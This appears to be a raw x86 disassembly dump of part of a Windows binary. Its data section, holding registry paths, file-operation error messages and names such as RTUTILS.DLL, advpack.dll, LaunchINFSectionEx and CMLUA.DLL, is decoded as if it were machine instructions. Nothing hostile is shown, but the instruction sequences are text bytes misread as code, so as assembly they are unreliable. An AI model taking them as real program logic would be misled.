  404060:	jb     0x404062
  404062:	pop    esp
  404063:	add    BYTE PTR [ebx+0x0],dl
  404066:	imul   eax,DWORD PTR [eax],0x67006e
  40406c:	ins    BYTE PTR es:[edi],dx
  40406d:	add    BYTE PTR [ebp+0x0],ah
  404070:	push   ebp
  404071:	add    BYTE PTR [ebx+0x0],dh
  404074:	add    BYTE PTR gs:[edx+0x0],dh
  404078:	dec    ecx
  404079:	add    BYTE PTR [esi+0x0],ch
  40407c:	data16 add BYTE PTR [edi+0x0],ch
  404080:	pop    esp
  404081:	add    BYTE PTR [eax],al
  404083:	add    BYTE PTR [eax],al
  404085:	add    BYTE PTR [eax],al
  404087:	add    BYTE PTR [ebx+0x0],al
  40408a:	ins    DWORD PTR es:[edi],dx
  40408b:	add    BYTE PTR [eax+eax*1+0x65],al
  40408f:	add    BYTE PTR [eax+eax*1+0x65],ch
  404093:	add    BYTE PTR [eax+eax*1+0x65],dh
  404097:	add    BYTE PTR [edx+0x0],dl
  40409a:	add    BYTE PTR gs:[edi+0x0],ah
  40409e:	dec    ebx
  40409f:	add    BYTE PTR [ebp+0x0],ah
  4040a2:	jns    0x4040a4
  4040a4:	push   edi
  4040a5:	add    BYTE PTR [ecx+0x0],ch
  4040a8:	je     0x4040aa
  4040aa:	push   0x75006f00
  4040af:	add    BYTE PTR [eax+eax*1+0x53],dh
  4040b3:	add    BYTE PTR [ebp+0x0],dh
  4040b6:	bound  eax,QWORD PTR [eax]
  4040b8:	dec    ebx
  4040b9:	add    BYTE PTR [ebp+0x0],ah
  4040bc:	jns    0x4040be
  4040be:	jae    0x4040c0
  4040c0:	sub    BYTE PTR [eax],al
  4040c2:	sub    DWORD PTR [eax],eax
  4040c4:	and    BYTE PTR [eax],al
  4040c6:	sub    eax,0x41002000
  4040cb:	add    BYTE PTR [edx+0x0],dh
  4040ce:	imul   eax,DWORD PTR [eax],0x680074
  4040d4:	ins    DWORD PTR es:[edi],dx
  4040d5:	add    BYTE PTR [ebp+0x0],ah
  4040d8:	je     0x4040da
  4040da:	imul   eax,DWORD PTR [eax],0x200063
  4040e0:	outs   dx,DWORD PTR ds:[esi]
  4040e1:	add    BYTE PTR [eax+0x0],dh
  4040e4:	add    BYTE PTR gs:[edx+0x0],dh
  4040e8:	popa   
  4040e9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4040ed:	add    BYTE PTR [edi+0x0],ch
  4040f0:	outs   dx,BYTE PTR ds:[esi]
  4040f1:	add    BYTE PTR [eax],ah
  4040f3:	add    BYTE PTR [esi+0x0],ah
  4040f6:	popa   
  4040f7:	add    BYTE PTR [ecx+0x0],ch
  4040fa:	ins    BYTE PTR es:[edi],dx
  4040fb:	add    BYTE PTR [ebp+0x0],ah
  4040fe:	add    BYTE PTR fs:[edx],bh
  404101:	add    BYTE PTR [eax],ah
  404103:	add    BYTE PTR ds:0x64006c00,ah
  404109:	add    BYTE PTR [edx],cl
  40410b:	add    BYTE PTR [eax],al
  40410d:	add    BYTE PTR [eax],al
  40410f:	add    BYTE PTR [ebx+0x0],dl
  404112:	dec    eax
  404113:	add    BYTE PTR [esi+0x0],al
  404116:	imul   eax,DWORD PTR [eax],0x65006c
  40411c:	dec    edi
  40411d:	add    BYTE PTR [eax+0x0],dh
  404120:	add    BYTE PTR gs:[edx+0x0],dh
  404124:	popa   
  404125:	add    BYTE PTR [eax+eax*1+0x69],dh
  404129:	add    BYTE PTR [edi+0x0],ch
  40412c:	outs   dx,BYTE PTR ds:[esi]
  40412d:	add    BYTE PTR [eax],ah
  40412f:	add    BYTE PTR [esi+0x0],al
  404132:	popa   
  404133:	add    BYTE PTR [ecx+0x0],ch
  404136:	ins    BYTE PTR es:[edi],dx
  404137:	add    BYTE PTR [ebp+0x0],ah
  40413a:	add    BYTE PTR fs:[eax],ah
  40413d:	add    BYTE PTR [edi+0x0],dh
  404140:	imul   eax,DWORD PTR [eax],0x680074
  404146:	and    BYTE PTR [eax],al
  404148:	add    BYTE PTR gs:[edx+0x0],dh
  40414c:	jb     0x40414e
  40414e:	outs   dx,DWORD PTR ds:[esi]
  40414f:	add    BYTE PTR [edx+0x0],dh
  404152:	cmp    al,BYTE PTR [eax]
  404154:	and    BYTE PTR [eax],al
  404156:	and    eax,0x6400
  40415b:	add    BYTE PTR [eax],al
  40415d:	add    BYTE PTR [eax],al
  40415f:	add    BYTE PTR [ebx+0x0],dl
  404162:	dec    edi
  404163:	add    BYTE PTR [esi+0x0],al
  404166:	push   esp
  404167:	add    BYTE PTR [edi+0x0],dl
  40416a:	inc    ecx
  40416b:	add    BYTE PTR [edx+0x0],dl
  40416e:	inc    ebp
  40416f:	add    BYTE PTR [eax+eax*1+0x4d],bl
  404173:	add    BYTE PTR [ecx+0x0],ch
  404176:	arpl   WORD PTR [eax],ax
  404178:	jb     0x40417a
  40417a:	outs   dx,DWORD PTR ds:[esi]
  40417b:	add    BYTE PTR [ebx+0x0],dh
  40417e:	outs   dx,DWORD PTR ds:[esi]
  40417f:	add    BYTE PTR [esi+0x0],ah
  404182:	je     0x404184
  404184:	pop    esp
  404185:	add    BYTE PTR [ebx+0x0],al
  404188:	outs   dx,DWORD PTR ds:[esi]
  404189:	add    BYTE PTR [esi+0x0],ch
  40418c:	outs   dx,BYTE PTR ds:[esi]
  40418d:	add    BYTE PTR [ebp+0x0],ah
  404190:	arpl   WORD PTR [eax],ax
  404192:	je     0x404194
  404194:	imul   eax,DWORD PTR [eax],0x6e006f
  40419a:	and    BYTE PTR [eax],al
  40419c:	dec    ebp
  40419d:	add    BYTE PTR [ecx+0x0],ah
  4041a0:	outs   dx,BYTE PTR ds:[esi]
  4041a1:	add    BYTE PTR [ecx+0x0],ah
  4041a4:	add    BYTE PTR [di+0x0],ah
  4041a8:	jb     0x4041aa
  4041aa:	pop    esp
  4041ab:	add    BYTE PTR [edi+0x0],al
  4041ae:	jne    0x4041b0
  4041b0:	imul   eax,DWORD PTR [eax],0x200064
  4041b6:	dec    ebp
  4041b7:	add    BYTE PTR [ecx+0x0],ah
  4041ba:	jo     0x4041bc
  4041bc:	jo     0x4041be
  4041be:	imul   eax,DWORD PTR [eax],0x67006e
  4041c4:	jae    0x4041c6
  4041c6:	add    BYTE PTR [eax],al
  4041c8:	push   edx
  4041c9:	add    BYTE PTR [ebp+0x0],ah
  4041cc:	ins    DWORD PTR es:[edi],dx
  4041cd:	add    BYTE PTR [edi+0x0],ch
  4041d0:	jbe    0x4041d2
  4041d2:	add    BYTE PTR gs:[edi+0x0],bl
  4041d6:	push   eax
  4041d7:	add    BYTE PTR [edx+0x0],dh
  4041da:	imul   eax,DWORD PTR [eax],0x610076
  4041e0:	je     0x4041e2
  4041e2:	add    BYTE PTR gs:[eax],al
  4041e5:	add    BYTE PTR [eax],al
  4041e7:	add    BYTE PTR [esi+0x0],cl
  4041ea:	outs   dx,DWORD PTR ds:[esi]
  4041eb:	add    BYTE PTR [eax],ah
  4041ed:	add    BYTE PTR [eax+0x0],dl
  4041f0:	add    BYTE PTR gs:[edx+0x0],dh
  4041f4:	ins    DWORD PTR es:[edi],dx
  4041f5:	add    BYTE PTR [ecx+0x0],ch
  4041f8:	jae    0x4041fa
  4041fa:	jae    0x4041fc
  4041fc:	imul   eax,DWORD PTR [eax],0x6e006f
  404202:	and    BYTE PTR [eax],al
  404204:	je     0x404206
  404206:	outs   dx,DWORD PTR ds:[esi]
  404207:	add    BYTE PTR [eax],ah
  404209:	add    BYTE PTR [ebp+0x0],dh
  40420c:	outs   dx,BYTE PTR ds:[esi]
  40420d:	add    BYTE PTR [ecx+0x0],ch
  404210:	outs   dx,BYTE PTR ds:[esi]
  404211:	add    BYTE PTR [ebx+0x0],dh
  404214:	je     0x404216
  404216:	popa   
  404217:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40421b:	add    BYTE PTR [eax],ah
  40421d:	add    BYTE PTR [ecx+0x0],ah
  404220:	ins    BYTE PTR es:[edi],dx
  404221:	add    BYTE PTR [eax+eax*1+0x20],ch
  404225:	add    BYTE PTR [ebp+0x0],dh
  404228:	jae    0x40422a
  40422a:	add    BYTE PTR gs:[edx+0x0],dh
  40422e:	and    BYTE PTR [eax],al
  404230:	jo     0x404232
  404232:	jb     0x404234
  404234:	outs   dx,DWORD PTR ds:[esi]
  404235:	add    BYTE PTR [esi+0x0],ah
  404238:	imul   eax,DWORD PTR [eax],0x65006c
  40423e:	add    BYTE PTR [eax],al
  404240:	push   ebx
  404241:	add    BYTE PTR [edi+0x0],cl
  404244:	inc    esi
  404245:	add    BYTE PTR [eax+eax*1+0x57],dl
  404249:	add    BYTE PTR [ecx+0x0],al
  40424c:	push   edx
  40424d:	add    BYTE PTR [ebp+0x0],al
  404250:	pop    esp
  404251:	add    BYTE PTR [ebp+0x0],cl
  404254:	imul   eax,DWORD PTR [eax],0x720063
  40425a:	outs   dx,DWORD PTR ds:[esi]
  40425b:	add    BYTE PTR [ebx+0x0],dh
  40425e:	outs   dx,DWORD PTR ds:[esi]
  40425f:	add    BYTE PTR [esi+0x0],ah
  404262:	je     0x404264
  404264:	pop    esp
  404265:	add    BYTE PTR [edi+0x0],dl
  404268:	imul   eax,DWORD PTR [eax],0x64006e
  40426e:	outs   dx,DWORD PTR ds:[esi]
  40426f:	add    BYTE PTR [edi+0x0],dh
  404272:	jae    0x404274
  404274:	pop    esp
  404275:	add    BYTE PTR [ebx+0x0],al
  404278:	jne    0x40427a
  40427a:	jb     0x40427c
  40427c:	jb     0x40427e
  40427e:	add    BYTE PTR gs:[esi+0x0],ch
  404282:	je     0x404284
  404284:	push   esi
  404285:	add    BYTE PTR [ebp+0x0],ah
  404288:	jb     0x40428a
  40428a:	jae    0x40428c
  40428c:	imul   eax,DWORD PTR [eax],0x6e006f
  404292:	pop    esp
  404293:	add    BYTE PTR [ebp+0x0],dl
  404296:	outs   dx,BYTE PTR ds:[esi]
  404297:	add    BYTE PTR [ecx+0x0],ch
  40429a:	outs   dx,BYTE PTR ds:[esi]
  40429b:	add    BYTE PTR [ebx+0x0],dh
  40429e:	je     0x4042a0
  4042a0:	popa   
  4042a1:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4042a5:	add    BYTE PTR [eax+eax*1+0x25],bl
  4042a9:	add    BYTE PTR [ebx+0x0],dh
  4042ac:	add    BYTE PTR [eax],al
  4042ae:	add    BYTE PTR [eax],al
  4042b0:	push   ebp
  4042b1:	add    BYTE PTR [esi+0x0],ch
  4042b4:	imul   eax,DWORD PTR [eax],0x73006e
  4042ba:	je     0x4042bc
  4042bc:	popa   
  4042bd:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4042c1:	add    BYTE PTR [eax+eax*1+0x69],al
  4042c5:	add    BYTE PTR [edx+0x0],dh
  4042c8:	add    BYTE PTR [eax],al
  4042ca:	add    BYTE PTR [eax],al
  4042cc:	and    eax,0x5c007300
  4042d1:	add    BYTE PTR ds:0x2e007300,ah
  4042d7:	add    BYTE PTR [ebx+0x0],ah
  4042da:	ins    DWORD PTR es:[edi],dx
  4042db:	add    BYTE PTR [ebx+0x0],dh
  4042de:	add    BYTE PTR [eax],al
  4042e0:	sub    eax,0x2d002d00
  4042e5:	add    BYTE PTR ds:0x2d002d00,ch
  4042eb:	add    BYTE PTR ds:0x2d002d00,ch
  4042f1:	add    BYTE PTR ds:0x2d002d00,ch
  4042f7:	add    BYTE PTR ds:0x2d002d00,ch
  4042fd:	add    BYTE PTR ds:0x20002d00,ch
  404303:	add    BYTE PTR [eax+eax*1+0x52],dl
  404307:	add    BYTE PTR [ecx+0x0],bl
  40430a:	dec    ecx
  40430b:	add    BYTE PTR [esi+0x0],cl
  40430e:	inc    edi
  40430f:	add    BYTE PTR [eax],ah
  404311:	add    BYTE PTR [eax+eax*1+0x4f],dl
  404315:	add    BYTE PTR [eax],ah
  404317:	add    BYTE PTR [eax+eax*1+0x45],al
  40431b:	add    BYTE PTR [eax+eax*1+0x45],cl
  40431f:	add    BYTE PTR [eax+eax*1+0x45],dl
  404323:	add    BYTE PTR [eax],ah
  404325:	add    BYTE PTR [eax+0x0],cl
  404328:	dec    ecx
  404329:	add    BYTE PTR [eax+eax*1+0x44],al
  40432d:	add    BYTE PTR [ebp+0x0],al
  404330:	dec    esi
  404331:	add    BYTE PTR [eax],ah
  404333:	add    BYTE PTR [eax+0x0],dl
  404336:	push   edx
  404337:	add    BYTE PTR [edi+0x0],cl
  40433a:	inc    esi
  40433b:	add    BYTE PTR [ecx+0x0],cl
  40433e:	dec    esp
  40433f:	add    BYTE PTR [ebp+0x0],al
  404342:	and    BYTE PTR [eax],al
  404344:	and    BYTE PTR [eax],al
  404346:	sub    eax,0x2d002d00
  40434b:	add    BYTE PTR ds:0x2d002d00,ch
  404351:	add    BYTE PTR ds:0x2d002d00,ch
  404357:	add    BYTE PTR ds:0x2d002d00,ch
  40435d:	add    BYTE PTR ds:0x0,ch
  404363:	add    BYTE PTR [ebx+0x0],dl
  404366:	dec    eax
  404367:	add    BYTE PTR [edi+0x0],cl
  40436a:	push   edx
  40436b:	add    BYTE PTR [eax+eax*1+0x53],dl
  40436f:	add    BYTE PTR [ebp+0x0],al
  404372:	push   edx
  404373:	add    BYTE PTR [esi+0x0],dl
  404376:	dec    ecx
  404377:	add    BYTE PTR [ebx+0x0],al
  40437a:	inc    ebp
  40437b:	add    BYTE PTR [esi+0x0],cl
  40437e:	inc    ecx
  40437f:	add    BYTE PTR [ebp+0x0],cl
  404382:	inc    ebp
  404383:	add    BYTE PTR [eax],ah
  404385:	add    BYTE PTR ds:0x25002000,ch
  40438b:	add    BYTE PTR [ebx+0x0],dh
  40438e:	add    BYTE PTR [eax],al
  404390:	inc    esp
  404391:	add    BYTE PTR [ebp+0x0],ah
  404394:	ins    BYTE PTR es:[edi],dx
  404395:	add    BYTE PTR [ebp+0x0],ah
  404398:	je     0x40439a
  40439a:	add    BYTE PTR gs:[ecx+0x0],al
  40439e:	ins    BYTE PTR es:[edi],dx
  40439f:	add    BYTE PTR [eax+eax*1+0x48],ch
  4043a3:	add    BYTE PTR [ecx+0x0],ch
  4043a6:	add    BYTE PTR fs:[eax+eax*1+0x65],ah
  4043ab:	add    BYTE PTR [esi+0x0],ch
  4043ae:	push   eax
  4043af:	add    BYTE PTR [edx+0x0],dh
  4043b2:	outs   dx,DWORD PTR ds:[esi]
  4043b3:	add    BYTE PTR [esi+0x0],ah
  4043b6:	imul   eax,DWORD PTR [eax],0x65006c
  4043bc:	and    BYTE PTR [eax],al
  4043be:	data16 add BYTE PTR [ecx+0x0],ah
  4043c2:	imul   eax,DWORD PTR [eax],0x65006c
  4043c8:	add    BYTE PTR fs:[eax],al
  4043cb:	add    BYTE PTR [eax],al
  4043cd:	add    BYTE PTR [eax],al
  4043cf:	add    BYTE PTR [eax],ah
  4043d1:	add    BYTE PTR [eax+eax*1+0x65],al
  4043d5:	add    BYTE PTR [eax+eax*1+0x65],ch
  4043d9:	add    BYTE PTR [eax+eax*1+0x65],dh
  4043dd:	add    BYTE PTR [ecx+0x0],al
  4043e0:	ins    BYTE PTR es:[edi],dx
  4043e1:	add    BYTE PTR [eax+eax*1+0x48],ch
  4043e5:	add    BYTE PTR [ecx+0x0],ch
  4043e8:	add    BYTE PTR fs:[eax+eax*1+0x65],ah
  4043ed:	add    BYTE PTR [esi+0x0],ch
  4043f0:	push   eax
  4043f1:	add    BYTE PTR [edx+0x0],dh
  4043f4:	outs   dx,DWORD PTR ds:[esi]
  4043f5:	add    BYTE PTR [esi+0x0],ah
  4043f8:	imul   eax,DWORD PTR [eax],0x65006c
  4043fe:	and    BYTE PTR [eax],al
  404400:	jae    0x404402
  404402:	jne    0x404404
  404404:	arpl   WORD PTR [eax],ax
  404406:	arpl   WORD PTR [eax],ax
  404408:	add    BYTE PTR gs:[ebp+0x0],ah
  40440c:	add    BYTE PTR fs:[ebp+0x0],ah
  404410:	add    BYTE PTR fs:[eax],al
  404413:	add    BYTE PTR [eax],al
  404415:	add    BYTE PTR [eax],al
  404417:	add    BYTE PTR [edx+0x54],dl
  40441a:	push   ebp
  40441b:	push   esp
  40441c:	dec    ecx
  40441d:	dec    esp
  40441e:	push   ebx
  40441f:	cs inc esp
  404421:	dec    esp
  404422:	dec    esp
  404423:	add    BYTE PTR [edx+esi*2+0x61],dl
  404427:	arpl   WORD PTR [ebp+0x52],sp
  40442a:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x78457265
  404433:	inc    ecx
  404434:	add    BYTE PTR [eax],al
  404436:	add    BYTE PTR [eax],al
  404438:	push   esp
  404439:	jb     0x40449c
  40443b:	arpl   WORD PTR [ebp+0x44],sp
  40443e:	gs jb  0x4044a6
  404441:	imul   esi,DWORD PTR [bp+di+0x74],0x78457265
  404449:	inc    ecx
  40444a:	add    BYTE PTR [eax],al
  40444c:	push   esp
  40444d:	jb     0x4044b0
  40444f:	arpl   WORD PTR [ebp+0x50],sp
  404452:	jb     0x4044bd
  404454:	outs   dx,BYTE PTR ds:[esi]
  404455:	je     0x4044bd
  404457:	inc    ecx
  404458:	add    BYTE PTR [eax],al
  40445a:	add    BYTE PTR [eax],al
  40445c:	push   esp
  40445d:	jb     0x4044c0
  40445f:	arpl   WORD PTR [ebp+0x50],sp
  404462:	jb     0x4044cd
  404464:	outs   dx,BYTE PTR ds:[esi]
  404465:	je     0x4044cd
  404467:	inc    ebp
  404468:	js     0x4044ab
  40446a:	add    BYTE PTR [eax],al
  40446c:	push   esp
  40446d:	jb     0x4044d0
  40446f:	arpl   WORD PTR [ebp+0x44],sp
  404472:	jne    0x4044e1
  404474:	jo     0x4044bb
  404476:	js     0x4044b9
  404478:	add    BYTE PTR [eax],al
  40447a:	add    BYTE PTR [eax],al
  40447c:	popa   
  40447d:	add    BYTE PTR [eax+eax*1+0x76],ah
  404481:	add    BYTE PTR [eax+0x0],dh
  404484:	popa   
  404485:	add    BYTE PTR [ebx+0x0],ah
  404488:	imul   eax,DWORD PTR [eax],0x2e
  40448b:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40448f:	add    BYTE PTR [eax+eax*1+0x0],ch
  404493:	add    BYTE PTR [edx+0x75],dl
  404496:	outs   dx,BYTE PTR ds:[esi]
  404497:	push   ebx
  404498:	gs je  0x404510
  40449b:	jo     0x4044e0
  40449d:	outs   dx,DWORD PTR ds:[esi]
  40449e:	ins    DWORD PTR es:[edi],dx
  40449f:	ins    DWORD PTR es:[edi],dx
  4044a0:	popa   
  4044a1:	outs   dx,BYTE PTR ds:[esi]
  4044a2:	add    BYTE PTR fs:[ecx+eiz*2+0x75],cl
  4044a7:	outs   dx,BYTE PTR ds:[esi]
  4044a8:	arpl   WORD PTR [eax+0x49],bp
  4044ab:	dec    esi
  4044ac:	inc    esi
  4044ad:	push   ebx
  4044ae:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4044b3:	outs   dx,BYTE PTR ds:[esi]
  4044b4:	inc    ebp
  4044b5:	js     0x4044b7
  4044b7:	add    BYTE PTR [edi+0x0],al
  4044ba:	add    BYTE PTR gs:[eax+eax*1+0x50],dh
  4044bf:	add    BYTE PTR [edx+0x0],dh
  4044c2:	outs   dx,DWORD PTR ds:[esi]
  4044c3:	add    BYTE PTR [ebx+0x0],ah
  4044c6:	inc    ecx
  4044c7:	add    BYTE PTR [eax+eax*1+0x64],ah
  4044cb:	add    BYTE PTR [edx+0x0],dh
  4044ce:	add    BYTE PTR gs:[ebx+0x0],dh
  4044d2:	jae    0x4044d4
  4044d4:	and    BYTE PTR [eax],al
  4044d6:	outs   dx,DWORD PTR ds:[esi]
  4044d7:	add    BYTE PTR [esi+0x0],ah
  4044da:	and    BYTE PTR [eax],al
  4044dc:	and    eax,0x20005300
  4044e1:	add    BYTE PTR [esi+0x0],ah
  4044e4:	popa   
  4044e5:	add    BYTE PTR [ecx+0x0],ch
  4044e8:	ins    BYTE PTR es:[edi],dx
  4044e9:	add    BYTE PTR [ebp+0x0],ah
  4044ec:	add    BYTE PTR fs:[eax],ah
  4044ef:	add    BYTE PTR [edi+0x0],dh
  4044f2:	imul   eax,DWORD PTR [eax],0x680074
  4044f8:	and    BYTE PTR [eax],al
  4044fa:	add    BYTE PTR gs:[edx+0x0],dh
  4044fe:	jb     0x404500
  404500:	outs   dx,DWORD PTR ds:[esi]
  404501:	add    BYTE PTR [edx+0x0],dh
  404504:	sub    al,0x0
  404506:	and    BYTE PTR [eax],al
  404508:	push   0x65005200
  40450d:	add    BYTE PTR [ebx+0x0],dh
  404510:	jne    0x404512
  404512:	ins    BYTE PTR es:[edi],dx
  404513:	add    BYTE PTR [eax+eax*1+0x20],dh
  404517:	add    BYTE PTR ds:0x30002000,bh
  40451d:	add    BYTE PTR [eax+0x0],bh
  404520:	and    eax,0x2e007800
  404525:	add    BYTE PTR [eax],al
  404527:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40452b:	add    BYTE PTR [ecx+0x0],ah
  40452e:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  404533:	add    BYTE PTR [edx+0x0],ah
  404536:	jb     0x404538
  404538:	popa   
  404539:	add    BYTE PTR [edx+0x0],dh
  40453c:	jns    0x40453e
  40453e:	and    BYTE PTR [eax],al
  404540:	outs   dx,DWORD PTR ds:[esi]
  404541:	add    BYTE PTR [esi+0x0],ah
  404544:	and    BYTE PTR [eax],al
  404546:	and    eax,0x20007300
  40454b:	add    BYTE PTR [esi+0x0],ah
  40454e:	popa   
  40454f:	add    BYTE PTR [ecx+0x0],ch
  404552:	ins    BYTE PTR es:[edi],dx
  404553:	add    BYTE PTR [ebp+0x0],ah
  404556:	add    BYTE PTR fs:[eax],ah
  404559:	add    BYTE PTR [edi+0x0],dh
  40455c:	imul   eax,DWORD PTR [eax],0x680074
  404562:	and    BYTE PTR [eax],al
  404564:	add    BYTE PTR gs:[edx+0x0],dh
  404568:	jb     0x40456a
  40456a:	outs   dx,DWORD PTR ds:[esi]
  40456b:	add    BYTE PTR [edx+0x0],dh
  40456e:	sub    al,0x0
  404570:	and    BYTE PTR [eax],al
  404572:	push   0x65005200
  404577:	add    BYTE PTR [ebx+0x0],dh
  40457a:	jne    0x40457c
  40457c:	ins    BYTE PTR es:[edi],dx
  40457d:	add    BYTE PTR [eax+eax*1+0x20],dh
  404581:	add    BYTE PTR ds:0x30002000,bh
  404587:	add    BYTE PTR [eax+0x0],bh
  40458a:	and    eax,0x2e007800
  40458f:	add    BYTE PTR [eax],al
  404591:	add    BYTE PTR [eax],al
  404593:	add    BYTE PTR ds:0x532553,ah
  404599:	add    BYTE PTR [eax],al
  40459b:	add    BYTE PTR ds:0x73252c73,ah
  4045a1:	sub    al,0x2c
  4045a3:	and    eax,0x64
  4045a8:	inc    ebx
  4045a9:	popa   
  4045aa:	ins    BYTE PTR es:[edi],dx
  4045ab:	ins    BYTE PTR es:[edi],dx
  4045ac:	dec    esp
  4045ad:	popa   
  4045ae:	jne    0x40461e
  4045b0:	arpl   WORD PTR [eax+0x49],bp
  4045b3:	outs   dx,BYTE PTR ds:[esi]
  4045b4:	push   bx
  4045b6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4045bb:	outs   dx,BYTE PTR ds:[esi]
  4045bc:	inc    ebp
  4045bd:	js     0x4045df
  4045bf:	sub    eax,0x614c202d
  4045c4:	jne    0x404634
  4045c6:	arpl   WORD PTR [eax+0x49],bp
  4045c9:	dec    esi
  4045ca:	inc    esi
  4045cb:	push   ebx
  4045cc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4045d1:	outs   dx,BYTE PTR ds:[esi]
  4045d2:	inc    ebp
  4045d3:	js     0x4045f5
  4045d5:	outs   dx,DWORD PTR ds:[esi]
  4045d6:	outs   dx,BYTE PTR ds:[esi]
  4045d7:	and    BYTE PTR [esi+0x69],ah
  4045da:	ins    BYTE PTR es:[edi],dx
  4045db:	and    BYTE PTR gs:0x6e612073,ah
  4045e2:	and    BYTE PTR fs:[ebx+0x65],dh
  4045e6:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4045ea:	outs   dx,BYTE PTR ds:[esi]
  4045eb:	and    BYTE PTR ds:0x41462073,ah
  4045f1:	dec    ecx
  4045f2:	dec    esp
  4045f3:	inc    ebp
  4045f4:	inc    esp
  4045f5:	and    DWORD PTR [eax],esp
  4045f7:	and    BYTE PTR [eax+0x72],ch
  4045fa:	cmp    eax,0x78257830
  4045ff:	add    BYTE PTR [ebx+0x61],al
  404602:	ins    BYTE PTR es:[edi],dx
  404603:	ins    BYTE PTR es:[edi],dx
  404604:	dec    esp
  404605:	popa   
  404606:	jne    0x404676
  404608:	arpl   WORD PTR [eax+0x49],bp
  40460b:	outs   dx,BYTE PTR ds:[esi]
  40460c:	push   bx
  40460e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404613:	outs   dx,BYTE PTR ds:[esi]
  404614:	inc    ebp
  404615:	js     0x404637
  404617:	sub    eax,0x614c202d
  40461c:	jne    0x40468c
  40461e:	arpl   WORD PTR [eax+0x49],bp
  404621:	dec    esi
  404622:	inc    esi
  404623:	push   ebx
  404624:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404629:	outs   dx,BYTE PTR ds:[esi]
  40462a:	inc    ebp
  40462b:	js     0x40464d
  40462d:	outs   dx,DWORD PTR ds:[esi]
  40462e:	outs   dx,BYTE PTR ds:[esi]
  40462f:	and    BYTE PTR [esi+0x69],ah
  404632:	ins    BYTE PTR es:[edi],dx
  404633:	and    BYTE PTR gs:0x6e612073,ah
  40463a:	and    BYTE PTR fs:[ebx+0x65],dh
  40463e:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  404642:	outs   dx,BYTE PTR ds:[esi]
  404643:	and    BYTE PTR ds:0x65722073,ah
  404649:	je     0x4046c0
  40464b:	jb     0x4046bb
  40464d:	gs and BYTE PTR fs:[edx+0x65],dh
  404652:	bound  ebp,QWORD PTR [edi+0x6f]
  404655:	je     0x404677
  404657:	jb     0x4046be
  404659:	jno    0x4046d0
  40465b:	imul   esi,DWORD PTR [edx+0x65],0x2e64
  404662:	add    BYTE PTR [eax],al
  404664:	inc    ebx
  404665:	add    BYTE PTR [ebp+0x0],cl
  404668:	dec    esp
  404669:	add    BYTE PTR [ebp+0x0],dl
  40466c:	inc    ecx
  40466d:	add    BYTE PTR [esi],ch
  40466f:	add    BYTE PTR [eax+eax*1+0x4c],al
  404673:	add    BYTE PTR [eax+eax*1+0x0],cl
  404677:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40467b:	add    BYTE PTR [ecx+0x0],ah
  40467e:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  404683:	add    BYTE PTR [edx+0x0],ah
  404686:	jb     0x404688
  404688:	popa   
  404689:	add    BYTE PTR [edx+0x0],dh
  40468c:	jns    0x40468e
  40468e:	and    BYTE PTR [eax],al
  404690:	data16 add BYTE PTR [ecx+0x0],ah
  404694:	imul   eax,DWORD PTR [eax],0x65006c
  40469a:	add    BYTE PTR fs:[eax],ah
  40469d:	add    BYTE PTR [ecx+0x0],ch
  4046a0:	outs   dx,BYTE PTR ds:[esi]
  4046a1:	add    BYTE PTR [eax],ah
  4046a3:	add    BYTE PTR [edi+0x0],al
  4046a6:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
  4046ab:	add    BYTE PTR [edi+0x0],ch
  4046ae:	inc    ebx
  4046af:	add    BYTE PTR [edx+0x0],dh
  4046b2:	add    BYTE PTR gs:[ecx+0x0],ah
  4046b6:	je     0x4046b8
  4046b8:	add    BYTE PTR gs:[ecx+0x0],cl
  4046bc:	outs   dx,BYTE PTR ds:[esi]
  4046bd:	add    BYTE PTR [ebx+0x0],dh
  4046c0:	je     0x4046c2
  4046c2:	popa   
  4046c3:	add    BYTE PTR [esi+0x0],ch
  4046c6:	arpl   WORD PTR [eax],ax
  4046c8:	add    BYTE PTR gs:[ecx+0x0],al
  4046cc:	jae    0x4046ce
  4046ce:	inc    ecx
  4046cf:	add    BYTE PTR [eax+eax*1+0x6d],ah
  4046d3:	add    BYTE PTR [ecx+0x0],ch
  4046d6:	outs   dx,BYTE PTR ds:[esi]
  4046d7:	add    BYTE PTR [eax+0x0],cl
  4046da:	popa   
  4046db:	add    BYTE PTR [esi+0x0],ch
  4046de:	add    BYTE PTR fs:[eax+eax*1+0x65],ch
  4046e3:	add    BYTE PTR [esi],ch
  4046e5:	add    BYTE PTR [eax],ah
  4046e7:	add    BYTE PTR [edi+0x0],al
  4046ea:	dec    esp
  4046eb:	add    BYTE PTR [ebp+0x0],al
  4046ee:	and    BYTE PTR [eax],al
  4046f0:	cmp    eax,0x25002000
  4046f5:	add    BYTE PTR [ebx],ah
  4046f7:	add    BYTE PTR [eax+0x0],bh
  4046fa:	add    BYTE PTR [eax],al
  4046fc:	pop    edi
  4046fd:	inc    edi
  4046fe:	gs je  0x404744
  404701:	outs   dx,DWORD PTR ds:[esi]
  404702:	inc    ebx
  404703:	jb     0x40476a
  404705:	popa   
  404706:	je     0x40476d
  404708:	dec    ecx
  404709:	outs   dx,BYTE PTR ds:[esi]
  40470a:	jae    0x404780
  40470c:	popa   
  40470d:	outs   dx,BYTE PTR ds:[esi]
  40470e:	arpl   WORD PTR [ebp+0x41],sp
  404711:	jae    0x404754
  404713:	fs ins DWORD PTR es:[edi],dx
  404715:	imul   ebp,DWORD PTR [esi+0x48],0x6c646e61
  40471c:	add    BYTE PTR gs:[eax],al
  40471f:	add    BYTE PTR [edi+0x0],al
  404722:	add    BYTE PTR gs:[eax+eax*1+0x50],dh
  404727:	add    BYTE PTR [edx+0x0],dh
  40472a:	outs   dx,DWORD PTR ds:[esi]
  40472b:	add    BYTE PTR [ebx+0x0],ah
  40472e:	inc    ecx
